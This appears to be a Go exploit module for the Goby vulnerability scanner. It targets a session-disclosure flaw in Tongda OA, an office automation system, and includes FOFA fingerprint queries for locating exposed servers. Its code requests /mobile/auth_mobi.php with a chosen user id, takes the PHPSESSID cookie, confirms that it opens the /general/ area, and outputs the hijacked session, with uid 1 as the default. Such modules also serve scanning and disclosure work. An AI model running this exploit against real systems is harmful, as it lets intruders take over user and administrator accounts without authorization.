package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Tongda OA user SESSION session disclosure vulnerability",
    "Description": "<p>Tongda OA office system provides mobile office, WeChat office, collaborative office, process management, information portal, knowledge management, task project, system integration, cost control management, etc., to comprehensively improve work efficiency.</p><p>There is a SESSION session disclosure vulnerability in Tongda OA office system, through which an attacker can obtain the SESSION information of a logged-in user and log in to the system.</p>",
    "Product": "Tongda-OA",
    "Homepage": "http://www.tongda2000.com/",
    "DisclosureDate": "2021-04-07",
    "Author": "itardc@163.com",
    "FofaQuery": "(body=\"/static/templates/2013_01/index.css/\" || body=\"javascript:document.form1.UNAME.focus()\" || body=\"href=\\\"/static/images/tongda.ico\\\"\" || body=\"<link rel=\\\"shortcut icon\\\" href=\\\"/images/tongda.ico\\\" />\" || (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2013\" || title=\"Office Anywhere 2015\" || (body=\"tongda.ico\" && (title=\"OA\" || title=\"办公\")) || body=\"class=\\\"STYLE1\\\">新OA办公系统\") || (body=\"/static/templates/2013_01/index.css/\" || body=\"javascript:document.form1.UNAME.focus()\" || body=\"href=\\\"/static/images/tongda.ico\\\"\" || body=\"<link rel=\\\"shortcut icon\\\" href=\\\"/images/tongda.ico\\\" />\" || (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2013\" || title=\"Office Anywhere 2015\" || (body=\"tongda.ico\" && (title=\"OA\" || title=\"办公\")) || body=\"class=\\\"STYLE1\\\">新OA办公系统\")",
    "GobyQuery": "(body=\"/static/templates/2013_01/index.css/\" || body=\"javascript:document.form1.UNAME.focus()\" || body=\"href=\\\"/static/images/tongda.ico\\\"\" || body=\"<link rel=\\\"shortcut icon\\\" href=\\\"/images/tongda.ico\\\" />\" || (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2013\" || title=\"Office Anywhere 2015\" || (body=\"tongda.ico\" && (title=\"OA\" || title=\"办公\")) || body=\"class=\\\"STYLE1\\\">新OA办公系统\") || (body=\"/static/templates/2013_01/index.css/\" || body=\"javascript:document.form1.UNAME.focus()\" || body=\"href=\\\"/static/images/tongda.ico\\\"\" || body=\"<link rel=\\\"shortcut icon\\\" href=\\\"/images/tongda.ico\\\" />\" || (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2013\" || title=\"Office Anywhere 2015\" || (body=\"tongda.ico\" && (title=\"OA\" || title=\"办公\")) || body=\"class=\\\"STYLE1\\\">新OA办公系统\")",
    "Level": "2",
    "Impact": "<p>There is a SESSION session disclosure vulnerability in Tongda OA office system, through which an attacker can obtain the SESSION information of a logged-in user and log in to the system.</p>",
    "Recommendation": "<p>1. The official has not been repaired, please contact the manufacturer to repair it in time: <a href=\"http://www.tongda2000.com/\">http://www.tongda2000.com/</a></p><p>2. By default, it is only open to the local</p><p>3. Finally, it can also cooperate with iptables to restrict opening</p>",
    "References": [
        "https://mp.weixin.qq.com/s/llyGEBRo0t-C7xOLMDYfFQ"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "uid",
            "type": "input",
            "value": "1",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/mobile/auth_mobi.php?isAvatar=1&uid=0&P_VER=0",
                "header": {},
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/mobile/auth_mobi.php?isAvatar=1&uid={{{uid}}}&P_VER=0",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "==",
                        "value": "",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "PHPSessionID|lastheader|regex|Set-Cookie:(.*)",
                "output|define|variable|替换Cookie：{{{PHPSessionID}}}后访问：{{{fixedhostinfo}}}/general/"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.8",
    "Translation": {
        "CN": {
            "Name": "通达OA 用户 SESSION 会话泄露漏洞",
            "Product": "TDXK-通达OA",
            "Description": "<p>通达OA办公系统提供移动办公，微信办公，协同办公，流程管理，信息门户，知识管理，任务项目，系统集成，费控管理等，全面提高工作效率。</p><p>通达OA办公系统存在SESSION会话泄露漏洞，攻击者可以通过该漏洞获取已登录用户的SESSION信息，从而登录到系统中。</p>",
            "Recommendation": "<p>1、官方还未修复，请及时联系厂商进行修复：<a href=\"http://www.tongda2000.com/\">http://www.tongda2000.com/</a></p><p style=\"text-align: start;\">2、默认只对本地开放</p><p style=\"text-align: start;\">3、最后还可以配合iptables限制开放</p>",
            "Impact": "<p>通达OA办公系统存在SESSION会话泄露漏洞，攻击者可以通过该漏洞获取已登录用户的SESSION信息，从而登录到系统中。</p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Tongda OA user SESSION session disclosure vulnerability",
            "Product": "Tongda-OA",
            "Description": "<p>Tongda OA office system provides mobile office, WeChat office, collaborative office, process management, information portal, knowledge management, task project, system integration, cost control management, etc., to comprehensively improve work efficiency.</p><p>There is a SESSION session disclosure vulnerability in Tongda OA office system, through which an attacker can obtain the SESSION information of a logged-in user and log in to the system.</p>",
            "Recommendation": "<p>1. The official has not been repaired, please contact the manufacturer to repair it in time: <a href=\"http://www.tongda2000.com/\">http://www.tongda2000.com/</a></p><p>2. By default, it is only open to the local</p><p>3. Finally, it can also cooperate with iptables to restrict opening</p>",
            "Impact": "<p>There is a SESSION session disclosure vulnerability in Tongda OA office system, through which an attacker can obtain the SESSION information of a logged-in user and log in to the system.</p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10176"
}`

	sendPayloadFlagRypQYM := func(hostinfo *httpclient.FixUrl, uid string) string {
		requestConfig := httpclient.NewGetRequestConfig("/mobile/auth_mobi.php?isAvatar=1&uid=" + uid + "&P_VER=0")
		requestConfig.FollowRedirect = false
		rsp, err := httpclient.DoHttpRequest(hostinfo, requestConfig)
		if err != nil || rsp == nil {
			return ""
		}
		if rsp.StatusCode != 200 {
			return ""
		}
		session := ""
		cookies := rsp.Cookies()
		for _, cookie := range cookies {
			if cookie.Name == "PHPSESSID" {
				session = cookie.Value
				break
			}
		}
		if session == "" {
			return ""
		}
		requestConfig = httpclient.NewGetRequestConfig("/general/")
		requestConfig.Header.Store("cookie", "PHPSESSID="+session+";")
		rsp, err = httpclient.DoHttpRequest(hostinfo, requestConfig)
		if rsp != nil && !strings.Contains(rsp.Utf8Html, "重新登录") {
			return session
		}
		return ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			session := sendPayloadFlagRypQYM(hostinfo, "1")
			if session == "" {
				return false
			}
			requestConfig := httpclient.NewGetRequestConfig("/general/")
			requestConfig.Header.Store("cookie", "PHPSESSID="+session+";")
			rsp, _ := httpclient.DoHttpRequest(hostinfo, requestConfig)
			if rsp != nil && !strings.Contains(rsp.Utf8Html, "重新登录") {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uid := goutils.B2S(ss.Params["uid"])
			session := sendPayloadFlagRypQYM(expResult.HostInfo, uid)
			if session != "" {
				requestConfig := httpclient.NewGetRequestConfig("/general/")
				requestConfig.Header.Store("cookie", "PHPSESSID="+session+";")
				rsp, _ := httpclient.DoHttpRequest(expResult.HostInfo, requestConfig)
				if rsp != nil && !strings.Contains(rsp.Utf8Html, "重新登录") {
					expResult.Success = true
					expResult.Output = "漏洞地址："+expResult.HostInfo.FixedHostInfo+"/general/\n将 Cookie 中对 PHPSESSID 替换为：" + session
				}
			}
			return expResult
		},
	))
}
